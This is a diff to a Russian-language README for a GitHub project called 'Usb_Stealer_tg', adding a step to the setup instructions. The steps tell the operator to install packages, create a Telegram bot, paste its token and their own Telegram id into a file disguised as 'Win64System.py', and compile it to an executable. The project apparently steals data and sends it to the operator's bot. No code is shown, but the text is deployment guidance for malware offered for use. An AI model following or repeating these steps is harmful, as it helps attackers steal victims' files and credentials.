@@ -7,6 +7,7 @@ github :: https://github.com/sblro4eeek/Usb_Stealer_tg
  pip install shutil
  pip instaall pyistaller
 3) Создайте тг бота в :: https://t.me/BotFather
+3.1) Напишите боту /start
 4) Зайдите в файл Win64System.py и вставьте в token(10 строка) свой токен от бота (которого вы создали в https://t.me/BotFather)
 5) Узнайте свой id телеграма и вставьте его в me(11 строка) (id можно посмотреть в https://t.me/getmyid_bot)
 6) Сохраните изменённый Win64System.py Затем запустите exe.bat и ждите компиляции файла
